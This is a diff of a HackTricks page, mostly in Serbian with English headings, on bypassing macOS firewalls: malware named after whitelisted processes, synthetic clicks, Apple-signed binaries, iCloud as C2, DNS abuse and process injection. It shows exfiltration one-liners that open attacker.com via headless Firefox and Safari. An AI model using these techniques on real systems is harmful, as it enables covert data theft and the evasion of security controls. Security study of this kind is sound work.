@@ -1,53 +1,53 @@
-# Bajpasiranje Firewall-a na macOS-u
+# macOS Bypassing Firewalls
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Pronađene tehnike
+## Found techniques
 
-Navedene tehnike su pronađene da funkcionišu u nekim macOS aplikacijama za firewall.
+Sledeće tehnike su pronađene kao funkcionalne u nekim macOS firewall aplikacijama.
 
-### Zloupotreba imena na beloj listi
+### Abusing whitelist names
 
-* Na primer, nazivanje malvera imenima dobro poznatih macOS procesa poput **`launchd`**
+* Na primer, pozivanje malvera sa imenima poznatih macOS procesa kao što su **`launchd`**
 
-### Sintetički Klik
+### Synthetic Click
 
-* Ako firewall zatraži dozvolu od korisnika, naterajte malver da **klikne na dozvoli**
+* Ako firewall traži dozvolu od korisnika, neka malver **klikne na dozvoli**
 
-### **Korišćenje Apple potpisanih binarnih fajlova**
+### **Use Apple signed binaries**
 
-* Poput **`curl`**, ali i drugih poput **`whois`**
+* Kao što su **`curl`**, ali i drugi poput **`whois`**
 
-### Dobro poznati Apple domeni
+### Well known apple domains
 
-Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima poput **`apple.com`** ili **`icloud.com`**. iCloud bi mogao biti korišćen kao C2.
+Firewall bi mogao da dozvoli veze sa poznatim Apple domenima kao što su **`apple.com`** ili **`icloud.com`**. I iCloud bi mogao da se koristi kao C2.
 
-### Generički Bajpas
+### Generic Bypass
 
-Neke ideje za pokušaj zaobilaženja firewall-a
+Neke ideje za pokušaj zaobilaženja firewalla
 
-### Provera dozvoljenog saobraćaja
+### Check allowed traffic
 
-Znanje o dozvoljenom saobraćaju će vam pomoći da identifikujete potencijalno beloliste domene ili koje aplikacije imaju dozvolu da im pristupe
+Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno belu listu domena ili koje aplikacije imaju dozvolu da im pristupe.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Zloupotreba DNS-a
 
-DNS rezolucije se vrše putem potpisanog aplikacije **`mdnsreponder`** koja će verovatno biti dozvoljena da kontaktira DNS servere.
+DNS rezolucije se vrše putem **`mdnsreponder`** potpisane aplikacije koja će verovatno biti dozvoljena da kontaktira DNS servere.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
@@ -78,9 +78,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Putem ubacivanja procesa
+### Putem injekcija procesa
 
-Ako možete **ubaciti kod u proces** koji je dozvoljen da se poveže sa bilo kojim serverom, možete zaobići zaštitu firewall-a:
+Ako možete **injektovati kod u proces** koji ima dozvolu da se poveže sa bilo kojim serverom, mogli biste zaobići zaštitu vatrozida:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,16 +91,16 @@ Ako možete **ubaciti kod u proces** koji je dozvoljen da se poveže sa bilo koj
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
